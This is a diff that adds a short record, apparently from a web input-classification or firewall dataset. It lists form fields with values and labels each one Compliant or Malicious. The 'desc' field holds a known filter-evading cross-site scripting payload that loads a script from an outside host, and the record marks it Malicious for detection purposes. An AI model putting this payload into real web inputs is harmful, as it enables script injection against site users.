@@ -1,0 +1,11 @@
+2016-06-24T06:07:30.132-06:00
+name : i1B'.'5T  wB'..7 gv8'S'.7.:.
+desc : &lt;SCRIPT&gt;document.write("&lt;SCRI");&lt;/SCRIPT&gt;PT SRC="http://ha.ckers.org/xss.js"&gt;&lt;/SCRIPT&gt;
+end : 27.06.2016
+budget : 7,464
+assignto[] : 1
+assignme : 1
+The parameter: name :  having value: i1B'.'5T  wB'..7 gv8'S'.7.:. is: Compliant
+The parameter: desc :  having value: &lt;SCRIPT&gt;document.write("&lt;SCRI");&lt;/SCRIPT&gt;PT SRC="http://ha.ckers.org/xss.js"&gt;&lt;/SCRIPT&gt; is: Malicious
+The parameter: end :  having value: 27.06.2016 is: Compliant
+The parameter: budget :  having value: 7,464 is: Compliant
